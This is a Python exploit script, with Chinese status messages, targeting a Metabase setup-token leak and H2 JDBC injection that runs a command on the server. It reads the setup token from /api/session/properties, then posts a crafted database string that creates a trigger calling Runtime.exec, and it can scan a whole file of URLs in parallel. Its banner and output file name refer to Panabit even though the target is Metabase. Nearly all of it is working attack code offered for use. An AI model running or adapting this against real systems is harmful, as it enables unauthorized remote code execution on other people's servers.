import json
import requests
import argparse
import sys,urllib3
from multiprocessing.dummy import Pool       
urllib3.disable_warnings()              

def banner():
    demo = """
██████╗  █████╗ ███╗   ██╗ █████╗ ██████╗ ██╗████████╗
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗██║╚══██╔══╝
██████╔╝███████║██╔██╗ ██║███████║██████╔╝██║   ██║   
██╔═══╝ ██╔══██║██║╚██╗██║██╔══██║██╔══██╗██║   ██║   
██║     ██║  ██║██║ ╚████║██║  ██║██████╔╝██║   ██║   
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝   
                                     authon:zm               
"""

def main():
    parser = argparse.ArgumentParser(description="welcome to use!")
    parser.add_argument('-u', '--url', dest='url', type=str, help='please input your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        with open(args.file, 'r', encoding='utf-8') as fp:
            url_list = [url.strip() for url in fp.readlines()]
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -u <url> or -f <file>")

def poc(target):
    payload_get = '/api/session/properties'
    headers_get = {
        'Content-Type':'application/json'
    }
    payload_post = '/api/setup/validate'
    headers_post = {
        'Content-Type': 'application/json',
        'Content-Length': '748'
    }
    try:
        res1 = requests.get(url=target+payload_get,headers=headers_get,verify=False,timeout=5)
        res2 = json.loads(res1.text)
        if 'setup-token' in res1.text and res2['setup-token'] != None:
            token = res2['setup-token']
            print(f'{target}存在token值：{token}')
            with open('result-Panabit.txt','a',encoding='utf-8')as ff:
                ff.write(f'{target}存在token值：{token}'+'\n')
            data = {
                "token": token,
                "details": {
                    "is_on_demand": False,
                    "is_full_sync": False,
                    "is_sample": False,
                    "cache_ttl": None,
                    "refingerprint": False,
                    "auto_run_queries": True,
                    "schedules": {},
                    "details": {
                        "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('ls -l')\n$$--=x",
                        "advanced-options": False,
                        "ssl": True
                    },
                    "name": "an-sec-research-team",
                    "engine": "h2"
                }
            }
            proxies = {
                        'http':'http://127.0.0.1:8080',
                        'https':'http://127.0.0.1:8080',
                    }
            res3 = requests.post(url=target + payload_post, headers=headers_post, data=json.dumps(data), verify=False,proxies=proxies,timeout=5)
            print(res3.text)
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception:
        print(f"{target}该站点存在问题!")

if __name__ == '__main__':
    main()
